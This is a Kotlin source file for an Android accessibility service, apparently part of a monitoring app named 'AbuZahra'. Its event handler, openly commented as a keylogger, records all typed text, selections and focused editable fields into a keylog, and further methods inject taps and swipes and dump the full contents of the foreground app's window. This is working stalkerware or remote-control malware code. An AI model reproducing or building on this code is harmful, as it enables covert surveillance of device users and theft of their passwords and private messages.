package com.abuzahra.manager.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.abuzahra.manager.executor.MonitorExecutor

class AbuZahraAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AbuZahraAccessibility"
        var instance: AbuZahraAccessibilityService? = null
            private set
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "Accessibility Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    // Keylogger - capture text input
                    val text = event.text?.toString() ?: ""
                    if (text.isNotBlank()) {
                        MonitorExecutor.appendKeylog(text)
                    }
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                    val text = event.text?.toString() ?: ""
                    if (text.isNotBlank()) {
                        MonitorExecutor.appendKeylog(text)
                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val source = event.source
                    if (source != null) {
                        val text = source.text?.toString() ?: ""
                        if (text.isNotBlank() && source.isEditable) {
                            MonitorExecutor.appendKeylog(text)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event", e)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.i(TAG, "Accessibility Service destroyed")
    }

    // ===== GESTURE METHODS =====

    fun performClick(x: Float, y: Float): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        return try {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
                .build()
            dispatchGesture(gesture, null, null)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Gesture click failed", e)
            false
        }
    }

    fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        return try {
            val path = Path().apply {
                moveTo(x1, y1)
                lineTo(x2, y2)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
                .build()
            dispatchGesture(gesture, null, null)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Gesture swipe failed", e)
            false
        }
    }

    // ===== NODE METHODS =====

    fun findNodeByText(text: String): AccessibilityNodeInfo? {
        val rootNode = rootInActiveWindow ?: return null
        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
        return nodes.firstOrNull()
    }

    fun findNodeByViewId(viewId: String): AccessibilityNodeInfo? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) return null
        val rootNode = rootInActiveWindow ?: return null
        val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
        return nodes.firstOrNull()
    }

    fun performClickOnNode(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    // ===== WINDOW CONTENT DUMP =====

    fun dumpWindowContent(): String {
        val rootNode = rootInActiveWindow ?: return "No window content available"
        return dumpNode(rootNode, 0)
    }

    private fun dumpNode(node: AccessibilityNodeInfo, depth: Int): String {
        val sb = StringBuilder()
        val indent = "  ".repeat(depth)
        sb.appendLine("${indent}class=${node.className}, text='${node.text}', desc='${node.contentDescription}', " +
            "resId='${node.viewIdResourceName}', clickable=${node.isClickable}, " +
            "enabled=${node.isEnabled}, editable=${node.isEditable}")
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            sb.append(dumpNode(child, depth + 1))
        }
        return sb.toString()
    }
}
